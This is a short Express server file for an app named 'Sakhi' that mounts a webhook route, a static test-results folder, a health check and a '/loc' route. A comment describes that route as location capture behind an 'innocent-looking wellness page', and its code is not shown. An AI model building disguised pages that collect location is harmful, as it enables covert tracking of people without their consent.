require('dotenv').config({ override: true });
const express = require('express');
const app = express();

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

const path = require('path');

// Routes
const webhookRoute = require('./routes/webhook');
app.use('/webhook', webhookRoute);

// Location capture route (innocent-looking wellness page)
const locationRoute = require('./routes/location');
app.use('/loc', locationRoute);

// Serve test results as static files
app.use('/test-results', express.static(path.join(__dirname, 'test-results')));

// Health check
app.get('/', (req, res) => {
  res.send('Sakhi is running 🌸');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Sakhi server running on port ${PORT}`);
});
